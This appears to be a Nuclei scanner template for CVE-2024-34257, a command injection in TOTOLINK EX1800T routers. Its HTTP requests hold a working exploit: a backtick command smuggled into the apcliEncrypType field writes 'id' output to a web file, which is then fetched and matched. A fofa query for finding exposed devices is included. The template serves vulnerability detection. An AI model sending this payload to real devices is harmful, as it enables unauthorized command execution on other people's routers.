id: CVE-2024-34257

info:
  name: TOTOLINK EX1800T TOTOLINK EX1800T - Command Injection
  author: pussycat0x
  severity: high
  description: |
    TOTOLINK EX1800T V9.1.0cu.2112_B20220316 has a vulnerability in the apcliEncrypType parameter that allows unauthorized execution of arbitrary commands, allowing an attacker to obtain device administrator privileges.
  reference:
    - https://example.com/reference
    - https://github.com/ZackSecurity/VulnerReport/blob/cve/totolink/EX1800T/1.md
    - https://immense-mirror-b42.notion.site/TOTOLINK-EX1800T-has-an-unauthorized-arbitrary-command-execution-vulnerability-2f3e308f5e1d45a2b8a64f198cacc350
    - https://github.com/fkie-cad/nvd-json-data-feeds
  metadata:
    fofa-query: title="totolink"
  tags: cve,cve2024,rce,unauth

variables:
  file: "{{rand_base(6)}}"

http:
  - raw:
      - |
        POST /cgi-bin/cstecgi.cgi HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Referer: {{RootURL}}/page/index.html?timestamp=1714114057910

        {
        "token":"",
        "apcliEncrypType":"`id>../{{file}}.txt`",
        "topicurl":"setWiFiExtenderConfig"
        }
      - |
        GET /{{file}}.txt HTTP/1.1
        Host: {{Hostname}}


    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - '"success": true'

      - type: regex
        part: body_2
        regex:
          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"

      - type: status
        status:
          - 200
